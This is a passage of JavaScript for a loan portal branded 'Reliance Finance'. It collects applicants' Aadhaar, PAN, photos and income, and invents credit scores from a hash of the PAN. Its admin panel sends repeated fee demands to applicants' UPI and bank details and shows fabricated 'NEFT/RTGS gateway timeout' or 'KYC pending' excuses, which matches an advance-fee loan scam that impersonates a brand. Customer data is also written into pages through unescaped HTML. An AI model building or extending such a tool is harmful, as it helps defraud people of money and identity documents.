let activeCustomerMobile = "";
        const defaultTransferError = "Unable to complete NEFT/RTGS transaction. Bank Gateway Timeout / Invalid Routing Code or Active KYC verification pending at nodal bank branch.";

        function switchPage(pageId) {
            document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
            const target = document.getElementById('page-' + pageId);
            if (!target) return;
            target.classList.add('active');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function goToLoanStatus() {
            switchPage('status');
            setTimeout(() => {
                const statusInput = document.getElementById('searchKey');
                if (statusInput) {
                    statusInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    setTimeout(() => statusInput.focus(), 350);
                }
            }, 80);
        }

        function goToCustomerLogin() {
            switchPage('portal');
            setTimeout(() => {
                const loginBox = document.getElementById('loginBox');
                const loginInput = document.getElementById('loginIdentifier');
                if (loginBox) loginBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
                if (loginInput) setTimeout(() => loginInput.focus(), 350);
            }, 80);
        }

        function goToHomeCibil() {
            switchPage('home');
            setTimeout(() => {
                const cibilBox = document.getElementById('homeCibilPan');
                if (cibilBox) {
                    cibilBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    setTimeout(() => cibilBox.focus(), 350);
                }
            }, 80);
        }

        function selectLoanType(loanTypeName) {
            switchPage('apply');
            document.getElementById('appType').value = loanTypeName;
        }

        function getApplicationTenureMonths() {
            const value = parseFloat(document.getElementById('appTenureValue')?.value) || 0;
            const unit = document.getElementById('appTenureUnit')?.value || 'months';
            return unit === 'years' ? Math.round(value * 12) : Math.round(value);
        }

        function updateApplicationTenurePreview() {
            const value = parseFloat(document.getElementById('appTenureValue')?.value) || 0;
            const unit = document.getElementById('appTenureUnit')?.value || 'months';
            const months = getApplicationTenureMonths();
            const preview = document.getElementById('appTenurePreview');
            if (preview) preview.innerText = value > 0 ? `${value} ${unit === 'years' ? (value === 1 ? 'Year' : 'Years') : (value === 1 ? 'Month' : 'Months')} (${months} Months)` : 'Enter tenure';
        }

        function calculateEMI() {
            let p = parseFloat(document.getElementById('calcAmount').value) || 0;
            let r = (parseFloat(document.getElementById('calcRate').value) || 0) / 12 / 100;
            let n = parseInt(document.getElementById('calcTenure').value) || 1;

            if (p <= 0 || r <= 0 || n <= 0) {
                document.getElementById('resEMI').innerText = `₹0`;
                document.getElementById('resInterest').innerText = `₹0`;
                document.getElementById('resTotal').innerText = `₹0`;
                return;
            }

            let emi = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
            let totalPayment = emi * n;
            let totalInterest = totalPayment - p;

            document.getElementById('resEMI').innerText = `₹${Math.round(emi).toLocaleString('en-IN')}`;
            document.getElementById('resInterest').innerText = `₹${Math.round(totalInterest).toLocaleString('en-IN')}`;
            document.getElementById('resTotal').innerText = `₹${Math.round(totalPayment).toLocaleString('en-IN')}`;
        }
        calculateEMI();
        updateApplicationTenurePreview();

        function calculateHomeEMI() {
            let p = parseFloat(document.getElementById('homeCalcAmount').value) || 0;
            let r = (parseFloat(document.getElementById('homeCalcRate').value) || 8.5) / 12 / 100;
            let n = parseInt(document.getElementById('homeCalcTenure').value) || 60;
            
            if (p <= 0 || n <= 0) {
                document.getElementById('homeResEMI').innerText = `₹0`;
                document.getElementById('homeResInterest').innerText = `₹0`;
                document.getElementById('homeResTotal').innerText = `₹0`;
                return;
            }
            let emi = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
            let totalPayment = emi * n;
            let totalInterest = totalPayment - p;

            document.getElementById('homeResEMI').innerText = `₹${Math.round(emi).toLocaleString('en-IN')}`;
            document.getElementById('homeResInterest').innerText = `₹${Math.round(totalInterest).toLocaleString('en-IN')}`;
            document.getElementById('homeResTotal').innerText = `₹${Math.round(totalPayment).toLocaleString('en-IN')}`;
        }
        calculateHomeEMI();

        function getOrCreateDemoCibilScore(pan) {
            pan = String(pan || '').trim().toUpperCase();

            // Keep one score per PAN so the same PAN always gets the same
            // score, including after the customer later submits a loan form.
            let cibilScores = JSON.parse(localStorage.getItem('cibilScores') || '{}');
            if (cibilScores[pan] !== undefined && cibilScores[pan] !== null && String(cibilScores[pan]).trim() !== '') {
                return String(cibilScores[pan]);
            }

            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            let found = loans.find(l => String(l.pan || '').trim().toUpperCase() === pan);
            if (found && found.cibil !== undefined && found.cibil !== null && String(found.cibil).trim() !== '') {
                cibilScores[pan] = String(found.cibil);
                localStorage.setItem('cibilScores', JSON.stringify(cibilScores));
                return String(found.cibil);
            }

            // Demo-only deterministic estimate: different valid PANs get
            // different repeatable scores; the same PAN gets the same score.
            let hash = 0;
            for (let i = 0; i < pan.length; i++) {
                hash = ((hash << 5) - hash + pan.charCodeAt(i)) | 0;
            }
            hash = Math.abs(hash);
            let score = 650 + (hash % 251); // 650–900

            cibilScores[pan] = String(score);
            localStorage.setItem('cibilScores', JSON.stringify(cibilScores));
            return String(score);
        }

        function checkHomeCibil() {
            let pan = document.getElementById('homeCibilPan').value.trim().toUpperCase();
            let res = document.getElementById('homeCibilResult');

            if(!/^[A-Z]{5}[0-9]{4}[A-Z]$/.test(pan)) {
                res.innerHTML = `<span class="text-red-600">Please enter a valid 10-character PAN number.</span>`;
                return;
            }

            let score = getOrCreateDemoCibilScore(pan);
            let rating = Number(score) >= 800 ? 'Very Good' :
                         Number(score) >= 750 ? 'Good' :
                         Number(score) >= 700 ? 'Fair' : 'Needs Improvement';

            res.innerHTML = `<span class="text-blue-800">
                Estimated Credit Score for ${pan}: <strong>${score} (${rating})</strong><br>
                <small class="text-gray-500 font-normal">Demo estimate only — not an official CIBIL/bureau report and does not determine loan approval.</small>
            </span>`;
        }

        let uploadedPhotoBase64 = "";
        function convertImageToBase64(event) {
            let file = event.target.files[0];
            if (file) {
                let reader = new FileReader();
                reader.onload = function(e) {
                    uploadedPhotoBase64 = e.target.result;
                    document.getElementById('appPhoto').value = "Uploaded Photo Attached";
                };
                reader.readAsDataURL(file);
            }
        }

        let adminPhotoBase64 = "";
        function convertAdminImageToBase64(event) {
            let file = event.target.files[0];
            if (file) {
                let reader = new FileReader();
                reader.onload = function(e) {
                    adminPhotoBase64 = e.target.result;
                    document.getElementById('admPhoto').value = "Uploaded Photo Attached";
                };
                reader.readAsDataURL(file);
            }
        }

        if (!localStorage.getItem('loans')) localStorage.setItem('loans', '[]');

        document.getElementById('loanForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let photoVal = uploadedPhotoBase64 || document.getElementById('appPhoto').value || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150";

            const newLoan = {
                id: Date.now(),
                name: document.getElementById('appName').value,
                mobile: document.getElementById('appMobile').value,
                aadhaar: document.getElementById('appAadhaar').value,
                pan: document.getElementById('appPan').value.toUpperCase(),
                employment: document.getElementById('appEmployment').value,
                income: document.getElementById('appIncome').value,
                type: document.getElementById('appType').value,
                amount: document.getElementById('appAmount').value,
                rate: "",
                tenure: String(getApplicationTenureMonths() || 60),
                requestedTenureValue: document.getElementById('appTenureValue').value,
                requestedTenureUnit: document.getElementById('appTenureUnit').value,
                cibil: getOrCreateDemoCibilScore(document.getElementById('appPan').value),
                photo: photoVal,
                status: "Pending",
                feeAmount: "0",
                upiId: "",
                accNo: "",
                ifsc: "",
                feeNote: "",
                feeHeading: "",
                feeMessage: "",
                qrUrl: "",
                feeStatus: "NotRequested",
                paymentRequests: [],
                paymentsHistory: [],
                kycAadhaar: false,
                kycPan: false,
                kycSalary: false,
                showNoc: false,
                customError: "",
                applicationSource: "customer"
            };

            let loans = JSON.parse(localStorage.getItem('loans'));
            loans.push(newLoan);
            localStorage.setItem('loans', JSON.stringify(loans));

            alert('Loan Application Submitted Successfully!');
            this.reset();
            uploadedPhotoBase64 = "";
            switchPage('status');
        });

        async function adminLogin() {
            const u = document.getElementById('adminUser').value.trim();
            const p = document.getElementById('adminPass').value.trim();
            try {
                const response = await fetch('/api/admin/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: u, password: p })
                });
                const data = await response.json();
                if (!response.ok) throw new Error(data.message || 'Invalid Admin Username or Password!');
                sessionStorage.setItem('rf_admin_token', data.token);
                const recordsResponse = await window.rfApi.request('/api/admin/loans');
                const records = await recordsResponse.json();
                if (!recordsResponse.ok) throw new Error(records.message || 'Could not load admin records.');
                window.rfApi.setLoans(records, true);
                document.getElementById('adminLoginBox').classList.add('hidden');
                document.getElementById('adminDashboard').classList.remove('hidden');
                loadAdminTable();
            } catch (error) {
                alert(error.message || 'Admin login failed. Please try again.');
            }
        }

        function adminLogout() {
            sessionStorage.removeItem('rf_admin_token');
            document.getElementById('adminDashboard').classList.add('hidden');
            document.getElementById('adminLoginBox').classList.remove('hidden');
            document.getElementById('adminUser').value = '';
            document.getElementById('adminPass').value = '';
        }

        function loadAdminTable() {
            let loans = JSON.parse(localStorage.getItem('loans'));
            let tbody = document.getElementById('adminTableBody');
            tbody.innerHTML = '';

            loans.forEach(loan => {
                let history = loan.paymentsHistory || [];
                let historyHtml = "";
                
                if(history.length > 0) {
                    history.forEach(h => {
                        let badgeColor = h.status === 'Verified' ? 'text-green-700 bg-green-50' : 'text-amber-700 bg-amber-50';
                        historyHtml += `<div class="text-[11px] border-b pb-1 mb-1">
                            <strong>₹${Number(h.amount).toLocaleString('en-IN')}</strong> (${h.purpose})<br>
                            UTR: <span class="font-mono">${h.utr}</span><br>
                            Status: <span class="font-bold ${badgeColor} px-1 rounded">${h.status}</span>
                        </div>`;
                    });
                } else if(loan.feeStatus === "Submitted" || loan.feeStatus === "Verified") {
                    historyHtml = `<div class="text-[11px]">Fee: ₹${loan.feeAmount} | Status: <span class="font-bold">${loan.feeStatus}</span></div>`;
                } else {
                    historyHtml = `<span class="text-gray-400 text-xs">No payment yet</span>`;
                }

                let verifyBtn = history.some(h => h.status === "Pending") || loan.feeStatus === "Submitted" ? 
                    `<button onclick="verifyCustomerPayment(${loan.id})" class="bg-indigo-600 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-indigo-700 mt-1">Verify Payment</button>` : '';

                tbody.innerHTML += `
                    <tr class="border-b hover:bg-gray-50 align-top">
                        <td class="p-3"><img src="${loan.photo}" class="w-10 h-10 rounded-full object-cover border"></td>
                        <td class="p-3 font-semibold">${loan.name}<br><span class="text-xs font-normal text-gray-500 uppercase">${loan.pan}</span></td>
                        <td class="p-3 text-xs">${loan.mobile}<br>${loan.aadhaar}</td>
                        <td class="p-3 text-xs">${loan.type}<br>₹${Number(loan.income).toLocaleString('en-IN')} /mo</td>
                        <td class="p-3 font-bold text-blue-950">₹${Number(loan.amount).toLocaleString('en-IN')}</td>
                        <td class="p-3 text-xs">${historyHtml}${verifyBtn}
                            <button onclick="openAdminTransactionHistory(${loan.id})" class="bg-blue-950 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-blue-900 mt-1">Transaction History</button>
                        </td>
                        <td class="p-3 text-xs">
                            Govt ID: ${loan.kycAadhaar ? '<span class="text-green-600 font-bold">✓</span>' : '<span class="text-red-500">✗</span>'}<br>
                            PAN: ${loan.kycPan ? '<span class="text-green-600 font-bold">✓</span>' : '<span class="text-red-500">✗</span>'}<br>
                            Salary: ${loan.kycSalary ? '<span class="text-green-600 font-bold">✓</span>' : '<span class="text-red-500">✗</span>'}
                        </td>
                        <td class="p-3 space-x-1">
                            <button onclick="openApprovalModal(${loan.id})" class="bg-green-600 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-green-700">Approve</button>
                            <button onclick="updateStatus(${loan.id}, 'Rejected')" class="bg-red-600 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-red-700">Reject</button>
                            <button onclick="openPaymentRequestModal(${loan.id})" class="bg-yellow-500 text-blue-950 px-2 py-1 rounded text-xs font-bold hover:bg-yellow-400 mt-1 block text-center"><i class="fa-solid fa-qrcode mr-1"></i> Send Payment Req</button>
                            <button onclick="openTransferErrorModal(${loan.id})" class="bg-red-600 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-red-700 mt-1 block text-center"><i class="fa-solid fa-triangle-exclamation mr-1"></i> Transfer Failed Reason</button>
                            <button onclick="openEditModal(${loan.id})" class="bg-blue-600 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-blue-700 mt-1">Edit</button>
                            <button onclick="deleteLoan(${loan.id})" class="bg-gray-600 text-white px-2 py-1 rounded text-xs font-semibold hover:bg-gray-700 mt-1">Delete</button>
                        </td>
                    </tr>
                `;
            });
            updateNewApplicationCount();
        }

        function getCustomerApplications() {
            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            return loans.filter(l => l.applicationSource === 'customer');
        }

        function updateNewApplicationCount() {
            let count = getCustomerApplications().filter(l => l.status === 'Pending').length;
            let el = document.getElementById('newApplicationCount');
            if (el) el.textContent = count;
        }

        function openNewApplicationsModal() {
            renderNewApplications();
            document.getElementById('newApplicationsModal').classList.remove('hidden');
        }

        function closeNewApplicationsModal() {
            document.getElementById('newApplicationsModal').classList.add('hidden');
        }

        function renderNewApplications() {
            let applications = getCustomerApplications();
            let body = document.getElementById('newApplicationsBody');
            if (!applications.length) {
                body.innerHTML = '<div class="text-center py-12 text-gray-500"><i class="fa-solid fa-inbox text-4xl mb-3"></i><p class="font-semibold">No new customer applications found.</p><p class="text-sm">Website applications will appear here after a customer submits the form.</p></div>';
                return;
            }

            body.innerHTML = applications.map(loan => {
                let history = loan.paymentsHistory || [];
                let historyHtml = history.length ? history.map(h => `<div class="text-[11px] border-b pb-1 mb-1"><strong>₹${Number(h.amount || 0).toLocaleString('en-IN')}</strong> (${h.purpose || ''})<br>UTR: <span class="font-mono">${h.utr || ''}</span><br>Status: <span class="font-bold">${h.status || 'Pending'}</span></div>`).join('') : '<span class="text-gray-400 text-xs">No payment yet</span>';
                let pendingPayment = history.some(h => h.status === 'Pending') || loan.feeStatus === 'Submitted';
                let statusClass = loan.status === 'Approved' ? 'text-green-700 bg-green-50' : (loan.status === 'Rejected' ? 'text-red-700 bg-red-50' : 'text-yellow-700 bg-yellow-50');

                return `<div class="border rounded-xl p-4 mb-4 shadow-sm bg-gray-50">
                    <div class="grid grid-cols-1 md:grid-cols-6 gap-3 items-start">
                        <div class="flex items-center gap-3 md:col-span-2">
                            <img src="${loan.photo || ''}" class="w-12 h-12 rounded-full object-cover border bg-white">
                            <div><div class="font-bold text-blue-950">${loan.name || ''}</div><div class="text-xs text-gray-500">PAN: ${loan.pan || ''}</div><div class="text-xs text-gray-500">Mobile: ${loan.mobile || ''}</div></div>
                        </div>
                        <div class="text-xs"><b>Loan:</b> ${loan.type || ''}<br><b>Amount:</b> ₹${Number(loan.amount || 0).toLocaleString('en-IN')}<br><b>Income:</b> ₹${Number(loan.income || 0).toLocaleString('en-IN')}/mo</div>
                        <div class="text-xs"><b>CIBIL:</b> ${loan.cibil || '—'}<br><b>Tenure:</b> ${loan.tenure || '—'} months<br><b>Rate:</b> ${loan.rate || '—'}%</div>
                        <div class="text-xs"><b>Status:</b> <span class="font-bold px-2 py-1 rounded ${statusClass}">${loan.status || 'Pending'}</span><br><b>KYC:</b> Aadhaar ${loan.kycAadhaar ? '✓' : '✗'} | PAN ${loan.kycPan ? '✓' : '✗'} | Salary ${loan.kycSalary ? '✓' : '✗'}</div>
                        <div class="text-xs"><b>Payment:</b><div class="mt-1">${historyHtml}</div></div>
                    </div>
                    <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t">
                        <button onclick="openApprovalModal(${loan.id})" class="bg-green-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Approve</button>
                        <button onclick="updateStatus(${loan.id}, 'Rejected'); renderNewApplications();" class="bg-red-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Reject</button>
                        ${pendingPayment ? `<button onclick="verifyCustomerPayment(${loan.id}); renderNewApplications();" class="bg-indigo-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Verify Payment</button>` : ''}
                        <button onclick="openPaymentRequestModal(${loan.id})" class="bg-yellow-500 text-blue-950 px-3 py-1.5 rounded text-xs font-bold">Send Payment Req</button>
                        <button onclick="openTransferErrorModal(${loan.id})" class="bg-red-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Transfer Failed Reason</button>
                        <button onclick="openEditModal(${loan.id})" class="bg-blue-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Edit</button>
                        <button onclick="deleteLoan(${loan.id}); renderNewApplications();" class="bg-gray-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Delete</button>
                    </div>
                </div>`;
            }).join('');
        }

        function verifyCustomerPayment(id, paymentId) {
            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            loans = loans.map(l => {
                if (l.id !== id) return l;
                let history = Array.isArray(l.paymentsHistory) ? l.paymentsHistory : [];
                if (paymentId) {
                    history = history.map(h => h.id === paymentId ? {...h, status: 'Verified', verifiedAt: new Date().toISOString()} : h);
                } else {
                    history = history.map(h => ({...h, status: 'Verified', verifiedAt: new Date().toISOString()}));
                }

                let requests = Array.isArray(l.paymentRequests) ? l.paymentRequests : [];
                if (paymentId) {
                    requests = requests.map(r => r.id === (history.find(h => h.id === paymentId)?.requestId || '') ? {...r, status: 'Verified'} : r);
                } else {
                    requests = requests.map(r => r.status === 'Submitted' ? {...r, status: 'Verified'} : r);
                }
                let nextPending = requests.find(r => r.status === 'Pending');
                return {...l, paymentsHistory: history, paymentRequests: requests, feeStatus: nextPending ? 'Pending' : (history.some(h => h.status === 'Pending Verification') ? 'Submitted' : 'Verified')};
            });
            localStorage.setItem('loans', JSON.stringify(loans));
            loadAdminTable();
            if (document.getElementById('adminTransactionHistoryModal') && !document.getElementById('adminTransactionHistoryModal').classList.contains('hidden')) {
                let current = document.getElementById('adminTransactionHistoryModal').dataset.loanId;
                if (current) openAdminTransactionHistory(Number(current));
            }
            alert("Customer payment successfully verified by Admin!");
        }

        function openAdminTransactionHistory(id) {
            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            let found = loans.find(l => l.id === id);
            if (!found) return;
            let modal = document.getElementById('adminTransactionHistoryModal');
            modal.dataset.loanId = String(id);
            document.getElementById('adminHistoryCustomerName').innerText = `${found.name} | Mobile: ${found.mobile}`;
            let body = document.getElementById('adminTransactionHistoryBody');
            let history = Array.isArray(found.paymentsHistory) ? found.paymentsHistory : [];
            if (!history.length) {
                body.innerHTML = '<div class="text-center text-gray-500 py-8">No transaction history available.</div>';
            } else {
                body.innerHTML = history.map(h => `
                    <div class="border rounded-xl p-4 bg-gray-50">
                        <div class="flex flex-wrap justify-between gap-2">
                            <div><strong>₹${Number(h.amount || 0).toLocaleString('en-IN')}</strong> — ${h.purpose || 'Payment'}</div>
                            <span class="font-bold ${h.status === 'Verified' ? 'text-green-700' : 'text-amber-700'}">${h.status}</span>
                        </div>
                        <div class="text-xs text-gray-600 mt-2">UTR: <span class="font-mono">${h.utr || '—'}</span> | Date: ${h.date || '—'}</div>
                        <div class="mt-3 flex gap-2">
                            ${h.receiptImage ? `<button onclick="viewAdminPaymentReceipt(${id}, '${h.id || h.requestId || ''}')" class="bg-blue-600 text-white px-3 py-1.5 rounded text-xs font-semibold">View Receipt</button>` : ''}
                            ${h.status !== 'Verified' ? `<button onclick="verifyCustomerPayment(${id}, '${h.id || h.requestId || ''}')" class="bg-green-600 text-white px-3 py-1.5 rounded text-xs font-semibold">Verify Payment</button>` : ''}
                        </div>
                    </div>
                `).join('');
            }
            modal.classList.remove('hidden');
        }

        function closeAdminTransactionHistory() {
            document.getElementById('adminTransactionHistoryModal').classList.add('hidden');
        }

        function viewAdminPaymentReceipt(loanId, paymentId) {
            let loans = JSON.parse(localStorage.getItem('loans') || '[]');
            let found = loans.find(l => l.id === loanId);
            let item = (found?.paymentsHistory || []).find(h => h.id === paymentId || h.requestId === paymentId);
            if (!item || !item.receiptImage) {
                alert('Receipt image available nahi hai.');
                return;
            }
            let w = window.open('', '_blank');
            if (w) w.document.write(`<title>Payment Receipt</title><img src="${item.receiptImage}" style="max-width:100%;height:auto;display:block;margin:20px auto;">`);
        }

        function openAddModal() {
            document.getElementById('adminModalTitle').innerHTML = '<i class="fa-solid fa-user-plus mr-2"></i>Add New Loan Manually';
            document.getElementById('admEditId').value = '';
            document.getElementById('adminAddForm').reset();
            document.getElementById('admRate').value = '8.5';
            document.getElementById('admTenure').value = '60';
            document.getElementById('admCibil').value = '780';
            document.getElementById('admPhoto').value = 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150';
            document.getElementById('kycAadhaar').checked = true;
            document.getElementById('kycPan').checked = true;
            document.getElementById('kycSalary').checked = false;
            document.getElementById('admShowNoc').checked = false;
            document.getElementById('adminAddModal').classList.remove('hidden');
        }

        function openTransferErrorModal(id) {
            let loans = JSON.parse(localStorage.getItem('loans')) || [];
            let found = loans.find(l => l.id === id);
            if (!found) return;

            document.getElementById('transferErrorCustomerId').value = found.id;
            document.getElementById('transferErrorCustomerName').innerText = found.name || '';
            document.getElementById('transferErrorCustomerMobile').innerText = `Mobile: ${found.mobile || ''}`;
            document.getElementById('transferErrorMessage').value = found.customError || '';
            document.getElementById('transferErrorModal').classList.remove('hidden');
        }

        function closeTransferErrorModal() {
            document.getElementById('transferErrorModal').classList.add('hidden');
            document.getElementById('transferErrorForm').reset();
        }

        function clearTransferError() {
            document.getElementById('transferErrorMessage').value = '';
        }

        function saveTransferError(e) {
            e.preventDefault();

            let id = Number(document.getElementById('transferErrorCustomerId').value);
            let message = document.getElementById('transferErrorMessage').value.trim();
            let loans = JSON.parse(localStorage.getItem('loans')) || [];
            let found = loans.some(l => l.id === id);

            if (!found) {
                alert('Customer record nahi mila.');
                return;
            }

            loans = loans.map(l => l.id === id ? { ...l, customError: message } : l);
            localStorage.setItem('loans', JSON.stringify(loans));
            closeTransferErrorModal();
            loadAdminTable();
            alert(message ? 'Transfer failed reason customer profile par save ho gaya.' : 'Custom transfer failed reason clear kar diya gaya.');
        }

        let paymentRequestQrBase64 = "";

        function openPaymentRequestModal(id) {
            let loans = JSON.parse(localStorage.getItem('loans')) || [];
            let found = loans.find(l => l.id === id);
            if (!found) return;

            document.getElementById('paymentRequestCustomerId').value = found.id;
            document.getElementById('paymentRequestCustomerName').innerText = found.name;
            document.getElementById('paymentRequestCustomerMobile').innerText = `Mobile: ${found.mobile}`;

            document.getElementById('paymentRequestAmount').value = '';
            document.getElementById('paymentRequestType').value = 'QR';
            document.getElementById('paymentRequestHeading').value = 'Reliance Finance Payment Authorization Notice';
            document.getElementById('paymentRequestMessage').value = 'Reliance Finance has issued a payment request against your customer profile. Please review the payment details before submitting payment.';
            document.getElementById('paymentRequestUpi').value = '';
            document.getElementById('paymentRequestQrUrl').value = '';
            document.getElementById('paymentRequestAccNo').value = '';
            document.getElementById('paymentRequestIfsc').value = '';
            document.getElementById('paymentRequestPurpose').value = '';
            paymentRequestQrBase64 = "";
            document.getElementById('paymentRequestQrFile').value = '';

            togglePaymentRequestFields();
            document.getElementById('paymentRequestModal').classList.remove('hidden');
        }

        function closePaymentRequestModal() {
            document.getElementById('paymentRequestModal').classList.add('hidden');
            document.getElementById('paymentRequestForm').reset();
            paymentRequestQrBase64 = "";
            togglePaymentRequestFields();
        }

        function togglePaymentRequestFields() {
            let type = document.getElementById('paymentRequestType').value;
            document.getElementById('paymentRequestQrFields').classList.toggle('hidden', type !== 'QR');
            document.getElementById('paymentRequestBankFields').classList.toggle('hidden', type !== 'Bank');

            document.getElementById('paymentRequestUpi').required = type === 'QR';
            document.getElementById('paymentRequestAccNo').required = type === 'Bank';
            document.getElementById('paymentRequestIfsc').required = type === 'Bank';
        }

        function convertPaymentRequestQrToBase64(event) {
            let file = event.target.files[0];
            if (!file) return;
            let reader = new FileReader();
            reader.onload = function(e) {
                paymentRequestQrBase64 = e.target.result;
                document.getElementById('paymentRequestQrUrl').value = 'Uploaded QR Image Attached';
            };
            reader.readAsDataURL(file);
        }

        function sendPaymentRequest(e) {
            e.preventDefault();

            let id = Number(document.getElementById('paymentRequestCustomerId').value);
            let type = document.getElementById('paymentRequestType').value;
            let amount = document.getElementById('paymentRequestAmount').value;
            let heading = document.getElementById('paymentRequestHeading').value.trim();
            let message = document.getElementById('paymentRequestMessage').value.trim();
            let purpose = document.getElementById('paymentRequestPurpose').value.trim();

            if (!amount || Number(amount) <= 0 || !heading || !message || !purpose) {
                alert("Heading, message, amount aur payment purpose sabhi zaroor bharein.");
                return;
            }

            if (type === 'QR') {
                let upi = document.getElementById('paymentRequestUpi').value.trim();
                if (!upi) {
                    alert("QR / UPI payment ke liye UPI ID zaroor bharein.");
                    return;
                }
            } else {
                let acc = document.getElementById('paymentRequestAccNo').value.trim();
                let ifsc = document.getElementById('paymentRequestIfsc').value.trim();
                if (!acc || !ifsc) {
                    alert("Bank payment ke liye Account Number aur IFSC zaroor bharein.");
                    return;
                }
            }

            let loans = JSON.parse(localStorage.getItem('loans')) || [];
            let found = loans.find(l => l.id === id);
            if (!found) {
                alert("Customer record nahi mila.");
                return;
            }

            let requestId = 'PR-' + Date.now() + '-' + Math.random().toString(36).slice(2, 7).toUpperCase();
            let newRequest = {
                id: requestId,
                heading: heading,
                message: message,
                purpose: purpose,
                amount: String(amount),
                type: type,
                status: "Pending",
                createdAt: new Date().toISOString()
            };

            if (type === 'QR') {
                newRequest.upiId = document.getElementById('paymentRequestUpi').value.trim();
                newRequest.qrUrl = paymentRequestQrBase64 || document.getElementById('paymentRequestQrUrl').value.trim();
                newRequest.accNo = "";
                newRequest.ifsc = "";
            } else {
                newRequest.upiId = "";
                newRequest.qrUrl = "";
                newRequest.accNo = document.getElementById('paymentRequestAccNo').value.trim();
                newRequest.ifsc = document.getElementById('paymentRequestIfsc').value.trim().toUpperCase();
            }

            let updatedLoans = loans.map(l => {
                if (l.id !== id) return l;
                let requests = Array.isArray(l.paymentRequests) ? l.paymentRequests : [];
                requests.push(newRequest);
                return {
                    ...l,
                    paymentRequests: requests,
                    feeAmount: newRequest.amount,
                    feeNote: newRequest.purpose,
                    feeHeading: newRequest.heading,
                    feeMessage: newRequest.message,
                    paymentType: newRequest.type,
                    feeStatus: "Pending",
                    upiId: newRequest.upiId || "",
                    qrUrl: newRequest.qrUrl || "",
                    accNo: newRequest.accNo || "",
                    ifsc: newRequest.ifsc || ""
                };
            });

            localStorage.setItem('loans', JSON.stringify(updatedLoans));
            closePaymentRequestModal();
            loadAdminTable();
            alert("New payment request customer profile par successfully send kar di gayi. Aap isi customer ko kitni bhi baar alag amount/message ke saath request bhej sakte hain.");
        }

        function openEditModal(id) {
            let loans = JSON.parse(localStorage.getItem('loans'));
            let found = loans.find(l => l.id === id);
            if (!found) return;

            document.getElementById('adminModalTitle').innerHTML = '<i class="fa-solid fa-pen mr-2"></i>Edit Customer / Loan Details';
            document.getElementById('admEditId').value = found.id;
            document.getElementById('admName').value = found.name;
            document.getElementById('admMobile').value = found.mobile;
            document.getElementById('admAadhaar').value = found.aadhaar;
            document.getElementById('admPan').value = found.pan;
            document.getElementById('admEmployment').value = found.employment || 'Salaried';
            document.getElementById('admIncome').value = found.income;
            document.getElementById('admType').value = found.type;
            document.getElementById('admAmount').value = found.amount;
            document.getElementById('admRate').value = found.rate || '8.5';
            document.getElementById('admTenure').value = found.tenure || '60';
            document.getElementById('admCibil').value = found.cibil || '750';
            document.getElementById('admStatus').value = found.status;
            document.getElementById('admPhoto').value = found.photo;

            document.getElementById('kycAadhaar').checked = !!found.kycAadhaar;
            document.getElementById('kycPan').checked = !!found.kycPan;
            document.getElementById('kycSalary').checked = !!found.kycSalary;
            document.getElementById('admShowNoc').checked = !!found.showNoc;

            document.getElementById('adminAddModal').classList.remove('hidden');
        }

        function closeAddModal() {
            document.getElementById('adminAddModal').classList.add('hidden');
            document.getElementById('adminAddForm').reset();
            adminPhotoBase64 = "";
        }

        function saveAdminLoan(e) {
            e.preventDefault();
            let editId = document.getElementById('admEditId').value;
            let photoVal = adminPhotoBase64 || document.getElementById('admPhoto').value || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150";
            let loans = JSON.parse(localStorage.getItem('loans'));

            if (editId) {
                loans = loans.map(l => l.id == editId ? {
                    ...l,
                    name: document.getElementById('admName').value,
                    mobile: document.getElementById('admMobile').value,
                    aadhaar: document.getElementById('admAadhaar').value,
                    pan: document.getElementById('admPan').value.toUpperCase(),
                    employment: document.getElementById('admEmployment').value,
                    income: document.getElementById('admIncome').value,
                    type: document.getElementById('admType').value,
                    amount: document.getElementById('admAmount').value,
                    rate: document.getElementById('admRate').value,
                    tenure: document.getElementById('admTenure').value,
                    cibil: document.getElementById('admCibil').value,
                    photo: photoVal,
                    status: document.getElementById('admStatus').value,
                    kycAadhaar: document.getElementById('kycAadhaar').checked,
                    kycPan: document.getElementById('kycPan').checked,
                    kycSalary: document.getElementById('kycSalary').checked,
                    showNoc: document.getElementById('admShowNoc').checked
                } : l);
                alert('Loan Record Successfully Updated. Payment requests are sent separately by Admin.');
            } else {
                const newLoan = {
                    id: Date.now(),
                    name: document.getElementById('admName').value,
                    mobile: document.getElementById('admMobile').value,
                    aadhaar: document.getElementById('admAadhaar').value,
                    pan: document.getElementById('admPan').value.toUpperCase(),
                    employment: document.getElementById('admEmployment').value,
                    income: document.getElementById('admIncome').value,
                    type: document.getElementById('admType').value,
                    amount: document.getElementById('admAmount').value,
                    rate: document.getElementById('admRate').value,
                    tenure: document.getElementById('admTenure').value,
                    cibil: document.getElementById('admCibil').value,
                    photo: photoVal,
                    status: document.getElementById('admStatus').value,
                    feeAmount: "0",
                    feeNote: "",
                    paymentType: "",
                    qrUrl: "",
                    upiId: "",
                    accNo: "",
                    ifsc: "",
                    customError: "",
                    feeStatus: "NotRequested",
